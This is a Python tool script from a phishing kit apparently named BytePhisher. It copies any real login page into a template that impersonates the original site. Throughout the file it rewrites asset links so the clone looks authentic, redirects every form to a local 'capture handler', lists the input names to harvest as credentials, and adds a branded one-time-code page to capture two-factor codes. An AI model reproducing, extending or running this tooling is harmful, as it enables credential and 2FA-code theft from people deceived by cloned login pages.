#!/usr/bin/env python3
"""Import any login page as a BytePhisher template.

    python3 tools/import_site.py --url https://example.com/login --name MyCorp
    python3 tools/import_site.py --file ./page.html --name MyCorp --slug mycorp

What it does:
  * fetches the page (or reads a local file) and stores index.html
  * rewrites relative asset URLs (css/js/images) to absolute so the page
    renders correctly when served from BytePhisher
  * points every <form> action at "/" so submissions land on the capture
    handler
  * extracts the form's input names into fields.json (capture_fields)
  * writes an otp.html matching the page's brand colour
  * registers the site in templates/templates.json with the next free index

Everything is written under templates/, so the CLI picks it up immediately:
    ./bytephisher.py --list | grep mycorp
"""
import argparse
import html
import json
import os
import re
import sys
import urllib.request
from html.parser import HTMLParser
from urllib.parse import urljoin

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)
TEMPLATES = os.path.join(HERE, "templates")


class FormScanner(HTMLParser):
    """Collect <form> actions and every <input>/<select>/<textarea> name."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.inputs = []          # (name, type, placeholder)
        self.actions = []

    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            if a.get("action"):
                self.actions.append(a["action"])
        elif tag in ("input", "select", "textarea"):
            name = a.get("name")
            if name:
                self.inputs.append((name, a.get("type", "text"), a.get("placeholder", "")))

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)


def fetch(url):
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        "Accept-Language": "en-US,en;q=0.9"})
    with urllib.request.urlopen(req, timeout=25) as r:
        raw = r.read()
        charset = r.headers.get_content_charset() or "utf-8"
    return raw.decode(charset, "replace")


def absolutize(html_text, base_url):
    """Rewrite relative href/src/action URLs so assets still load."""
    def repl(m):
        attr, quote, value = m.group(1), m.group(2), m.group(3)
        if value.startswith(("http://", "https://", "//", "data:", "#", "javascript:")):
            return m.group(0)
        return f'{attr}={quote}{urljoin(base_url, value)}{quote}'
    return re.sub(r'\b(href|src|action|poster)\s*=\s*(["\'])([^"\']+)\2',
                  repl, html_text, flags=re.I)


def neutralise_forms(html_text):
    """Point every form at "/" and drop method overrides we don't need."""
    def repl(m):
        tag = m.group(0)
        tag = re.sub(r'action\s*=\s*(["\']).*?\1', 'action="/"', tag, flags=re.I)
        if not re.search(r'action\s*=', tag, flags=re.I):
            tag = tag.replace("<form", '<form action="/"', 1)
        tag = re.sub(r'method\s*=\s*(["\'])\w+\1', 'method="POST"', tag, flags=re.I)
        return tag
    return re.sub(r"<form\b[^>]*>", repl, html_text, flags=re.I)


def brand_colour(html_text, default="#2563eb"):
    m = re.search(r"#([0-9a-fA-F]{6})\b", html_text)
    return f"#{m.group(1)}" if m else default


def otp_page(name, brand, slug, label="verification code"):
    from tools.gen_templates import OTP_HTML
    return OTP_HTML.format(name=name, slug=slug, brand=brand,
                           initial=name[0].upper(), otp_label=label)


def import_site(url=None, file=None, name=None, slug=None, index=None, keep_otp=True):
    if not url and not file:
        raise SystemExit("pass --url or --file")
    base_url = url or ""
    html_text = fetch(url) if url else open(file, encoding="utf-8", errors="replace").read()
    if url:
        html_text = absolutize(html_text, url)
    html_text = neutralise_forms(html_text)

    scanner = FormScanner()
    scanner.feed(html_text)
    names = [n for n, _t, _p in scanner.inputs]
    # de-dupe, keep order; ensure a password field is present for verification
    seen, capture_fields = set(), []
    for n in names:
        if n not in seen:
            seen.add(n)
            capture_fields.append(n)

    slug = slug or re.sub(r"[^a-z0-9]+", "-", (name or "import").lower()).strip("-")
    man_path = os.path.join(TEMPLATES, "templates.json")
    manifest = json.load(open(man_path)) if os.path.isfile(man_path) else []
    if index is None:
        index = max([t["index"] for t in manifest], default=0) + 1

    folder = os.path.join(TEMPLATES, f"{index:02d}_{slug}")
    os.makedirs(folder, exist_ok=True)
    with open(os.path.join(folder, "index.html"), "w", encoding="utf-8") as f:
        f.write(html_text)
    if keep_otp:
        with open(os.path.join(folder, "otp.html"), "w", encoding="utf-8") as f:
            f.write(otp_page(name or slug, brand_colour(html_text), slug))
    with open(os.path.join(folder, "fields.json"), "w", encoding="utf-8") as f:
        json.dump({
            "capture_fields": capture_fields,
            "otp_fields": [f"otp_{i}" for i in range(1, 7)],
            "honeypot": "hp_email",
            "has_otp": bool(keep_otp),
            "imported": {"url": url, "file": file},
        }, f, indent=2)

    manifest = [t for t in manifest if t["index"] != index]
    manifest.append({"index": index, "slug": slug, "name": name or slug, "dir": folder})
    manifest.sort(key=lambda t: t["index"])
    json.dump(manifest, open(man_path, "w"), indent=2)

    return {"index": index, "slug": slug, "dir": folder, "capture_fields": capture_fields,
            "form_actions_seen": scanner.actions}


def main():
    ap = argparse.ArgumentParser(description="Import a login page as a BytePhisher template")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--url", help="live login page URL")
    src.add_argument("--file", help="local HTML file")
    ap.add_argument("--name", required=True, help="display name (e.g. 'MyCorp SSO')")
    ap.add_argument("--slug", help="folder slug (default: derived from --name)")
    ap.add_argument("--index", type=int, help="template index (default: next free)")
    args = ap.parse_args()

    res = import_site(url=args.url, file=args.file, name=args.name,
                      slug=args.slug, index=args.index)
    print(f"[bytephisher] imported -> {res['dir']}")
    print(f"[bytephisher] index    : {res['index']}  (select with -o {res['index']})")
    print(f"[bytephisher] fields   : {', '.join(res['capture_fields']) or '(none found)'}")
    print(f"[bytephisher] forms    : {res['form_actions_seen'] or '(no action attributes)'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
